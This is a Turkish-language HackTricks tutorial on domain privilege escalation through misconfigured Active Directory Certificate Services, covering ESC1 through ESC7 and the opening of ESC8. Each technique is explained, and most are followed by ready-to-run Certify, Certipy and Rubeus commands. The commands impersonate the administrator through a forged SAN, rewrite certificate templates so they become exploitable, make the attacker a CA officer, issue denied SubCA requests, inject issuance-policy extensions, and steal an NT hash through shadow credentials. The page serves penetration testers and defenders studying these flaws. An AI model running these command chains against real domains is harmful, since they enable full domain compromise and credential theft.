# AD CS Domain Yükseltme

{{#include ../../../banners/hacktricks-training.md}}


**Bu, gönderilerin yükseltme tekniği bölümlerinin bir özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Certificate Templates - ESC1

### Açıklama

### Yanlış Yapılandırılmış Certificate Templates - ESC1 Açıklaması

- **Enrolment hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.**
- **Manager approval gerekli değildir.**
- **Yetkili personelden imza alınması gerekmez.**
- **Certificate templates üzerindeki security descriptor'lar aşırı izin verici olacak şekilde yapılandırılmıştır ve düşük ayrıcalıklı kullanıcıların enrolment hakları elde etmesine olanak tanır.**
- **Certificate templates, authentication'ı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya EKU bulunmaması (SubCA) gibi Extended Key Usage (EKU) identifier'ları dahil edilmiştir.
- **İstek sahiplerinin Certificate Signing Request (CSR) içine bir subjectAltName eklemesine template tarafından izin verilir:**
- Active Directory (AD), mevcutsa kimlik doğrulaması için bir certificate içindeki subjectAltName'i (SAN) önceliklendirir. Bu, bir CSR içinde SAN belirtilerek herhangi bir kullanıcının (örneğin bir domain administrator) kimliğine bürünmek için certificate talep edilebileceği anlamına gelir. SAN'ın requester tarafından belirtilip belirtilemeyeceği, certificate template'in AD object'i içinde `mspki-certificate-name-flag` property'si aracılığıyla belirtilir. Bu property bir bitmask'tir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'inin mevcut olması, SAN'ın requester tarafından belirtilmesine izin verir.

> [!CAUTION]
> Açıklanan yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile certificate talep etmesine ve Kerberos veya SChannel üzerinden herhangi bir domain principal olarak authentication gerçekleştirmesine olanak tanır.

Bu özellik bazen ürünler veya deployment services tarafından HTTPS ya da host certificate'larının anlık olarak oluşturulmasını desteklemek için veya bilgi eksikliği nedeniyle etkinleştirilir.

Bu seçenekle bir certificate oluşturulmasının bir warning tetiklediği belirtilmektedir. Ancak authentication OID'si içerecek şekilde kopyalanıp değiştirilen mevcut bir certificate template'te (örneğin `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` template'i) bu durum söz konusu değildir.<sup>[[6]](#references)</sup>

### İstismar

**vulnerable certificate templates** bulmak için şunu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**bir yöneticiyi taklit etmek için bu zafiyetten kötüye yararlanmak** amacıyla şu komut çalıştırılabilir:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Ardından oluşturulan **certificate'i `.pfx`** formatına dönüştürebilir ve bunu tekrar **Rubeus veya certipy kullanarak authenticate olmak** için kullanabilirsiniz:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları olan "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest'ın yapılandırma şemasındaki certificate template'lerin; özellikle onay veya imza gerektirmeyen, Client Authentication ya da Smart Card Logon EKU'suna sahip ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'i etkin olanların enumeration işlemi, aşağıdaki LDAP query çalıştırılarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Certificate Templates - ESC2

### Açıklama

İkinci abuse senaryosu, ilkinin bir varyasyonudur:

1. Enrollment hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
2. Manager approval gereksinimi devre dışı bırakılır.
3. Authorized signatures gereksinimi atlanır.
4. Certificate template üzerindeki aşırı izinli security descriptor, düşük ayrıcalıklı kullanıcılara certificate enrollment hakları verir.
5. **Certificate template, Any Purpose EKU veya EKU içermeyecek şekilde tanımlanır.**

**Any Purpose EKU**, bir saldırganın client authentication, server authentication, code signing vb. **herhangi bir amaç** için certificate edinmesine izin verir. **ESC3 için kullanılan tekniğin** aynısı, bu senaryoyu exploit etmek için kullanılabilir.

**EKU içermeyen** ve subordinate CA certificate olarak işlev gören certificate'lar **herhangi bir amaç** için kullanılabilir ve **yeni certificate'ları imzalamak için de kullanılabilir**. Bu nedenle saldırgan, subordinate CA certificate kullanarak yeni certificate'larda rastgele EKU'lar veya alanlar belirtebilir.

Ancak **domain authentication** için oluşturulan yeni certificate'lar, varsayılan ayar olan subordinate CA'nın **`NTAuthCertificates`** object'i tarafından trusted olmaması durumunda çalışmaz. Bununla birlikte saldırgan, herhangi bir EKU'ya ve rastgele certificate değerlerine sahip **yeni certificate'lar** oluşturabilir. Bunlar çok çeşitli amaçlar için (ör. code signing, server authentication vb.) potansiyel olarak **abuse** edilebilir ve SAML, AD FS veya IPSec gibi network'teki diğer uygulamalar açısından önemli sonuçlara yol açabilir.<sup>[[6]](#references)</sup>

AD Forest’ın configuration schema'sı içinde bu senaryoyla eşleşen template'leri enumerate etmek için aşağıdaki LDAP query çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Enrolment Agent Template'leri - ESC3

### Açıklama

Bu senaryo birinci ve ikinci senaryoya benzer, ancak **farklı bir EKU'nun** (Certificate Request Agent) ve **2 farklı template'in** kötüye kullanılmasını içerir (bu nedenle 2 gereksinim kümesi vardır).

**Certificate Request Agent EKU'su** (OID 1.3.6.1.4.1.311.20.2.1), Microsoft dokümantasyonunda **Enrollment Agent** olarak bilinir ve bir principal'ın **başka bir kullanıcı adına** bir **certificate** için **enroll** olmasını sağlar.

**“Enrollment agent”**, böyle bir **template'e** enroll olur ve elde edilen **certificate'i kullanarak diğer kullanıcı adına bir CSR'yi birlikte imzalar**. Ardından **birlikte imzalanmış CSR'yi**, **“enroll on behalf of” işlemini destekleyen** bir **template'e** enroll olmak üzere CA'ya **gönderir** ve CA, **“diğer” kullanıcıya ait bir certificate** ile yanıt verir.<sup>[[6]](#references)</sup>

**Gereksinimler 1:**

- Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara enrollment hakları verilir.
- Manager approval gereksinimi belirtilmemiştir.
- Authorized signatures gereksinimi yoktur.
- Certificate template'in security descriptor'ı aşırı derecede izin vericidir ve düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Certificate template, Certificate Request Agent EKU'sunu içerir ve diğer principal'lar adına başka certificate template'lerinin istenmesini sağlar.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Manager approval atlatılır.
- Template'in schema version'ı 1'dir veya 2'den büyüktür ve Certificate Request Agent EKU'sunu gerektiren bir Application Policy Issuance Requirement belirtir.
- Certificate template'te tanımlanan bir EKU, domain authentication'a izin verir.
- Enrollment agent kısıtlamaları CA üzerinde uygulanmaz.

### Kötüye Kullanım

Bu senaryoyu kötüye kullanmak için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate** **edinmesine** izin verilen **kullanıcılar**, **enrollment agent**'ların enrollment yapmasına izin verilen şablonlar ve enrollment agent'ın adına işlem yapabileceği **hesaplar**, enterprise CA'ler tarafından kısıtlanabilir. Bu işlem, `certsrc.msc` **snap-in**'ini açıp **CA'ye sağ tıklayarak**, **Properties**'e **tıklayarak** ve ardından “Enrollment Agents” sekmesine **giderek** gerçekleştirilir.

Ancak CA'ler için **varsayılan** ayarın “**Do not restrict enrollment agents**” olduğu belirtilmektedir. Yöneticiler enrollment agent kısıtlamasını etkinleştirip “Restrict enrollment agents” olarak ayarladığında bile varsayılan yapılandırma son derece izin vericidir. **Everyone**'ın tüm şablonlarda herkes adına enrollment yapmasına izin verir.

## Vulnerable Certificate Template Access Control - ESC4

### **Açıklama**

**certificate templates** üzerindeki **security descriptor**, belirli **AD principals**'ların şablonla ilgili sahip olduğu **izinleri** tanımlar.

Bir **attacker**, bir **template**'i **değiştirmek** ve **önceki bölümlerde** açıklanan **exploitable misconfigurations**'lardan herhangi birini **uygulamak** için gerekli **izinlere** sahipse privilege escalation mümkün olabilir.

Certificate template'lere uygulanabilen dikkat çekici izinler şunlardır:<sup>[[6]](#references)</sup>

- **Owner:** Nesne üzerinde örtük denetim sağlar ve tüm özniteliklerin değiştirilmesine olanak tanır.
- **FullControl:** Herhangi bir özniteliği değiştirme yeteneği de dahil olmak üzere nesne üzerinde tam yetki sağlar.
- **WriteOwner:** Nesnenin sahibinin attacker'ın kontrolündeki bir principal ile değiştirilmesine izin verir.
- **WriteDacl:** Erişim denetimlerinin ayarlanmasına izin verir ve potansiyel olarak attacker'a FullControl verilebilir.
- **WriteProperty:** Herhangi bir nesne özelliğinin düzenlenmesine izin verir.

### Abuse

Şablonlar ve diğer PKI nesneleri üzerinde düzenleme haklarına sahip principal'ları belirlemek için Certify ile enumerate edin:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Önceki örnektekine benzer bir privesc:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir certificate template üzerinde yazma ayrıcalıklarına sahip olması durumudur. Bu durum, örneğin certificate template yapılandırmasının üzerine yazılarak template'in ESC1'e karşı savunmasız hâle getirilmesi için abuse edilebilir.

Yukarıdaki path'te görebileceğimiz gibi bu ayrıcalıklara yalnızca `JOHNPC` sahip, ancak kullanıcımız `JOHN`, `JOHNPC` için yeni `AddKeyCredentialLink` edge'ine sahip. Bu teknik certificates ile ilişkili olduğundan, [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinen bu saldırıyı da uyguladım.<sup>[[8]](#references)</sup> İşte kurbanın NT hash'ini almak için Certipy'nin `shadow auto` command'ının kısa bir ön izlemesi.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, bir sertifika şablonunun yapılandırmasını tek bir komutla **overwrite** edebilir. **Varsayılan olarak** Certipy, yapılandırmayı **ESC1'e karşı vulnerable** olacak şekilde **overwrite** eder. Ayrıca eski yapılandırmayı kaydetmek için **`-save-old` parametresini kullanabiliriz**; bu, saldırımızdan sonra yapılandırmayı **restore etmek** için faydalı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Güvenlik Açığı Bulunan PKI Nesnesi Erişim Denetimi - ESC5

### Açıklama

Birden fazla nesneyi; certificate templates ve certificate authority dışındaki nesneleri de kapsayan, ACL tabanlı bağlantılardan oluşan kapsamlı ve birbirine bağlı yapı, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunlardır:

- S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla compromise edilebilecek CA sunucusunun AD computer object'i.
- CA sunucusunun RPC/DCOM server'ı.
- Belirli container path'i olan `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` içindeki herhangi bir descendant AD object'i veya container'ı. Bu path; Certificate Templates container'ı, Certification Authorities container'ı, NTAuthCertificates object'i ve Enrollment Services Container gibi container ve object'leri içerir, ancak bunlarla sınırlı değildir.

Düşük yetkili bir attacker bu kritik bileşenlerden herhangi birinin kontrolünü ele geçirmeyi başarırsa PKI sisteminin güvenliği tehlikeye girebilir.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy post**'unda](https://cqureacademy.com/blog/enhanced-key-usage) ele alınan konu, Microsoft tarafından açıklanan **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag'inin etkilerine de değinmektedir. Bir Certification Authority (CA) üzerinde etkinleştirildiğinde bu configuration, Active Directory® üzerinden oluşturulanlar da dahil olmak üzere **herhangi bir request** için **user-defined values** değerlerinin **subject alternative name** içine eklenmesine izin verir. Sonuç olarak bu imkan, bir **intruder**'ın domain **authentication** için yapılandırılmış **herhangi bir template** üzerinden enrollment yapmasına olanak tanır; özellikle standart User template gibi **unprivileged** user enrollment'a açık template'ler üzerinden. Böylece bir certificate elde edilerek intruder'ın domain administrator veya domain içindeki **başka herhangi bir active entity** olarak authenticate olması sağlanabilir.<sup>[[9]](#references)</sup>

**Not**: Certificate Signing Request (CSR) içine **alternative names** ekleme yöntemi, `certreq.exe` içindeki `-attrib "SAN:"` argument'ı ( “Name Value Pairs” olarak adlandırılır) aracılığıyla gerçekleştirilir ve ESC1'deki SAN exploitation strategy'sinden farklıdır. Buradaki ayrım, **account information** bilgilerinin nasıl kapsüllendiğidir: Bir extension yerine certificate attribute içinde.

### Abuse

Ayarın etkinleştirilip etkinleştirilmediğini doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki command'ı kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem temelde **remote registry access** kullanır; dolayısıyla alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit edip istismar edebilir:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, **domain administrative** haklarına veya eşdeğer yetkilere sahip olunması koşuluyla, aşağıdaki komut herhangi bir workstation'dan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ortamınızdaki bu yapılandırmayı devre dışı bırakmak için flag şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Mayıs 2022 güvenlik güncellemelerinden sonra, yeni düzenlenen **sertifikalar**, **istekte bulunanın `objectSid` özelliğini** içeren bir **güvenlik uzantısı** barındıracaktır. ESC1 için bu SID, belirtilen SAN'dan türetilir. Ancak **ESC6** için SID, SAN'ı değil **istekte bulunanın `objectSid`** değerini yansıtır.\
> ESC6'yı exploit etmek için sistemin, **SAN'ı yeni güvenlik uzantısına göre önceliklendiren** ESC10'a (Weak Certificate Mappings) karşı savunmasız olması gerekir.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Açıklama

Bir certificate authority için access control, CA eylemlerini yöneten bir dizi izin aracılığıyla sağlanır. Bu izinler, `certsrv.msc`'ye erişip bir CA'ya sağ tıklanarak, properties seçilip Security sekmesine gidilerek görüntülenebilir. Ayrıca izinler, aşağıdakine benzer komutlarla PSPKI modülü kullanılarak enumerate edilebilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, sırasıyla “CA administrator” ve “Certificate Manager” rollerine karşılık gelen başlıca **`ManageCA`** ve **`ManageCertificates`** hakları hakkında bilgi sağlar.<sup>[[6]](#references)</sup>

#### Abuse

Bir certificate authority üzerinde **`ManageCA`** haklarına sahip olmak, principal’ın PSPKI kullanarak ayarları uzaktan değiştirmesine olanak tanır. Buna, herhangi bir template’te SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag’ini etkinleştirmek de dahildir; bu, domain escalation için kritik bir unsurdur.

Bu işlemin basitleştirilmesi, doğrudan GUI etkileşimi olmadan değişiklik yapılmasına olanak tanıyan PSPKI’nin **Enable-PolicyModuleFlag** cmdlet’inin kullanılmasıyla mümkündür.

**`ManageCertificates`** haklarına sahip olmak, bekleyen isteklerin onaylanmasını kolaylaştırarak “CA certificate manager approval” güvenlik önlemini etkili bir şekilde aşar.

Bir certificate istemek, onaylamak ve indirmek için **Certify** ve **PSPKI** modüllerinin bir kombinasyonu kullanılabilir:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Açıklama

> [!WARNING]
> **Önceki attack** sırasında **`Manage CA`** izinleri, **ESC6 attack** gerçekleştirmek için **EDITF_ATTRIBUTESUBJECTALTNAME2** flag'ini **etkinleştirmek** amacıyla kullanılmıştı; ancak CA service (`CertSvc`) yeniden başlatılana kadar bunun herhangi bir etkisi olmayacaktır. Bir kullanıcı **Manage CA** erişim hakkına sahip olduğunda, service'i **yeniden başlatmasına** da izin verilir. Ancak bu, kullanıcının service'i **uzaktan yeniden başlatabileceği** anlamına gelmez. Ayrıca, Mayıs 2022 security updates nedeniyle çoğu patched environment'ta E**SC6 out of the box çalışmayabilir**.

Bu nedenle burada başka bir attack sunulmaktadır.

Ön koşullar:

- Yalnızca **`ManageCA` permission**
- **`Manage Certificates`** permission (**`ManageCA`** üzerinden verilebilir)
- **`SubCA`** certificate template'i **etkinleştirilmiş** olmalıdır (**`ManageCA`** üzerinden etkinleştirilebilir)

Bu teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız certificate request'leri yayınlayabilmesi** gerçeğine dayanır. **`SubCA`** certificate template'i **ESC1** karşısında **vulnerable** durumdadır, ancak template'e yalnızca **administrator'lar** enroll olabilir. Bu nedenle bir **user**, **`SubCA`** template'ine enroll olmak için **request** gönderebilir; bu request **reddedilir**, ancak **daha sonra manager tarafından yayınlanır**.<sup>[[6]](#references)</sup>

#### Abuse

Kendi user'ınızı yeni bir officer olarak ekleyerek kendinize **`Manage Certificates`** erişim hakkı **verebilirsiniz**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template, `-enable-template` parametresiyle **CA** üzerinde etkinleştirilebilir. Varsayılan olarak `SubCA` template etkindir.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Bu saldırı için ön koşulları yerine getirdiysek, **`SubCA` şablonunu temel alan bir sertifika isteme** ile başlayabiliriz.

**Bu istek reddedile**cektir, ancak özel anahtarı kaydedip istek kimliğini not edeceğiz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` ve `Manage Certificates`** izinlerimizle, `ca` komutunu ve `-issue-request <request ID>` parametresini kullanarak **başarısız sertifika isteğini** verebiliriz.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve son olarak, `req` komutu ve `-retrieve <request ID>` parametresiyle **düzenlenen sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 abuse yöntemlerine (EDITF attribute'larını etkinleştirme veya bekleyen istekleri onaylama) ek olarak, **Certify 2.0** yalnızca Enterprise CA üzerinde *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren yepyeni bir primitive ortaya çıkardı.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC yöntemi, *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Bu yöntem geleneksel olarak meşru CA'ler tarafından **pending** isteklerdeki extension'ları güncellemek için kullanılırken, bir attacker bunu onay bekleyen bir isteğe **varsayılan olmayan bir certificate extension** (örneğin `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID'si) eklemek için abuse edebilir.

Hedeflenen template bu extension için **varsayılan bir değer tanımlamadığından**, istek sonunda issue edildiğinde CA attacker tarafından kontrol edilen değerin üzerine yazmaz. Bu nedenle ortaya çıkan certificate, attacker tarafından seçilen bir extension içerir ve bu extension:

* Diğer vulnerable template'ların Application / Issuance Policy gereksinimlerini karşılayabilir (privilege escalation'a yol açarak).
* Certificate'a üçüncü taraf sistemlerde beklenmedik trust sağlayan ek EKU'lar veya policy'ler enjekte edebilir.

Kısacası, daha önce ESC7'nin “daha az güçlü” kısmı olarak değerlendirilen *Manage Certificates*, artık CA configuration'a dokunmadan veya daha kısıtlayıcı *Manage CA* yetkisini gerektirmeden full privilege escalation ya da uzun süreli persistence için kullanılabilir.

#### Primitive'i Certify 2.0 ile abuse etme

1. **Pending olarak kalacak bir certificate request gönderin.** Bu işlem, manager approval gerektiren bir template ile zorlanabilir:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. Yeni `manage-ca` command'ini kullanarak **pending request'e özel bir extension ekleyin**:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Template zaten *Certificate Issuance Policies* extension'ını tanımlamıyorsa, yukarıdaki değer issuance sonrasında korunur.*

3. **Request'i issue edin** (rolünüzde *Manage Certificates* approval yetkileri de varsa) veya bir operator'ün onaylamasını bekleyin. Issue edildikten sonra certificate'ı indirin:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Ortaya çıkan certificate artık malicious issuance-policy OID'sini içerir ve sonraki attack'larda (ör. ESC13, domain escalation vb.) kullanılabilir.

> NOT: Aynı attack, `ca` command'i ve `-set-extension` parameter'ı aracılığıyla Certipy ≥ 4.7 ile de gerçekleştirilebilir.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Açıklama

> [!TIP]
> **AD CS'nin kurulu olduğu** ortamlarda, **vulnerable bir web enrollment endpoint'i** mevcutsa ve en az bir **certificate template** **domain computer enrollment ve client authentication** özelliğine izin veriyorsa (varsayılan **`Machine`** template'i gibi), spooler service'i aktif olan **herhangi bir computer'ın bir attacker tarafından compromise edilmesi mümkün hale gelir**!

AD CS tarafından, administrator'ların kurabileceği ek server role'leri üzerinden sunulan çeşitli **HTTP tabanlı enrollment yöntemleri** desteklenir. HTTP tabanlı certificate enrollment için kullanılan bu interface'ler **NTLM relay attack'lerine** açıktır. Bir attacker, **compromise edilmiş bir machine'den**, inbound NTLM üzerinden authenticate olan herhangi bir AD account'unu impersonate edebilir. Attacker, victim account'unu impersonate ederken bu web interface'lerine erişerek `User` veya `Machine` certificate template'lerini kullanıp client authentication certificate'ı **request** edebilir.

- **Web enrollment interface** (`http://<caserver>/certsrv/` adresinde bulunan eski bir ASP application), varsayılan olarak yalnızca HTTP kullanır ve bu nedenle NTLM relay attack'lerine karşı koruma sunmaz. Ayrıca Authorization HTTP header üzerinden yalnızca NTLM authentication'a açıkça izin verir; bu da Kerberos gibi daha güvenli authentication yöntemlerinin kullanılmasını engeller.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service ve **Network Device Enrollment Service** (NDES), varsayılan olarak Authorization HTTP header üzerinden negotiate authentication'ı destekler. Negotiate authentication hem **Kerberos** hem de **NTLM** desteği sunarak bir attack sırasında attacker'ın authentication'ı **NTLM'e downgrade etmesine** olanak tanır. Bu web service'leri varsayılan olarak HTTPS'i etkinleştirse de HTTPS tek başına **NTLM relay attack'lerine karşı koruma sağlamaz**. HTTPS service'lerini NTLM relay attack'lerinden korumak yalnızca HTTPS, channel binding ile birlikte kullanıldığında mümkündür. Ne yazık ki AD CS, channel binding için gereken IIS üzerindeki Extended Protection for Authentication'ı etkinleştirmez.<sup>[[6]](#references)</sup>

NTLM relay attack'lerindeki yaygın bir **sorun**, **NTLM session'larının kısa sürmesi** ve attacker'ın **NTLM signing gerektiren** service'lerle etkileşime girememesidir.

Bununla birlikte bu kısıtlama, kullanıcı için bir certificate edinmek amacıyla NTLM relay attack'i abuse edilerek aşılabilir; çünkü certificate'ın geçerlilik süresi session'ın süresini belirler ve certificate, **NTLM signing zorunlu tutan** service'lerle kullanılabilir. Stolen certificate kullanma talimatları için bkz.:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack'lerinin bir diğer kısıtlaması, **attacker tarafından kontrol edilen bir machine'in victim account tarafından authenticate edilmesi gerektiğidir**. Attacker ya bekleyebilir ya da bu authentication'ı **force** etmeye çalışabilir:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’nin `cas` command'i **enabled HTTP AD CS endpoint'lerini** enumerate eder:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

